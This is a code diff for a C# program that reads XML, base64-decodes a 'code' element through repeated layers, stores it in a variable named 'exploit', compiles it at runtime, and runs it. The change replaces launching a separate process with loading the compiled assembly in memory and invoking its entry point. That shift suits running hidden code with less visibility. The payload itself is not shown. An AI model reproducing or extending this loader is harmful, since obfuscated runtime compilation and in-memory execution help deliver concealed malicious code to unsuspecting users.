@@ -1,12 +1,11 @@
 ﻿using Microsoft.CSharp;
+using System;
 using System.CodeDom.Compiler;
 using System.Collections.Generic;
-using System.Diagnostics;
-using System.Text;
+using System.Reflection;
 using System.Xml.Linq;
 
-namespace DynamicCode
-{
+namespace DynamicCode {
     class Program
     {
         private const string _ref = "references";
@@ -14,7 +13,6 @@ namespace DynamicCode
         private const string _ver = "version";
         private const string _item = "item";
         private const string _code = "code";
-        private const string _encoding = "Windows-1252";
         private const string _exe = "exe";
         private static int iteration = 0;
 
@@ -45,7 +43,8 @@ namespace DynamicCode
             foreach (XElement c in o.Elements(_code))
                 exploit = ConvertItem(c.Value);
 
-            string exe = r.Attribute(_exe).Value;
+            string executingDirectory = AppDomain.CurrentDomain.BaseDirectory;
+            string exe = executingDirectory + r.Attribute(_exe).Value;
             using (var csc = new CSharpCodeProvider(info))
             {
                 var parameters = new CompilerParameters(data.ToArray(), exe, false);
@@ -54,14 +53,17 @@ namespace DynamicCode
                 if (results.Errors.Count > 0)
                     return;
             }
-            Process.Start(exe);
+            
+            Assembly assembly = Assembly.LoadFile(exe);
+            string[] newargs = { };
+            assembly.EntryPoint.Invoke(null, new object[] { newargs });
         }
         private static string ConvertItem(string s)
         {
             string returnval = s;
             for (int i = 1; i <= iteration; i++)
             {
-                returnval = returnval.Base64Decode(Encoding.GetEncoding(_encoding));
+                returnval = returnval.Base64Decode();
             }
             return returnval;
         }
